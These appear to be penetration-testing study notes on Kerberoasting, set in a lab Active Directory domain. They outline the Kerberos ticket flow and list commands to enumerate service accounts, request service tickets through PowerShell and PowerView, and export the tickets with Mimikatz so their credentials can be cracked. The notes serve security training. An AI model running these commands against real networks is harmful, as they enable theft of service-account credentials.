# Kerberoast

## Process

1. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (AS-REQ)
2. The TGT is encrypted, signed, & delivered to the user (AS-REP). Only krbtgt can open and read TGT data
3. TGT encrypted with krbtgt hash when requesting a TGS ticket (TGS-REQ)
4. TGS encrypted using target service's NTLM hash (TGS-REP)
5. The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ)
6. Optional mutual Authentication

## How to find

<table><thead><tr><th width="233">Info</th><th>Command</th></tr></thead><tbody><tr><td>PowerView</td><td><code>Get-NetUser -SPN</code></td></tr><tr><td>Active Directory Module</td><td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td></tr></tbody></table>

## How to reguest a TGS

<table><thead><tr><th width="221">Info</th><th>Command</th></tr></thead><tbody><tr><td>Native PowerShell #1</td><td><code>Add-Type -Assembly System.IdentityModel</code></td></tr><tr><td>Native PowerShell #2</td><td><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgm.dollarcorp.moneycorp.local"</code></td></tr><tr><td>PowerView</td><td><code>Request-SPNTicket</code></td></tr><tr><td>Confirm TGS recievew</td><td><code>klist</code></td></tr></tbody></table>

## Export Ticket to disk

`Invoke-Mimikatz -Command '"kerberos::list /export"'`
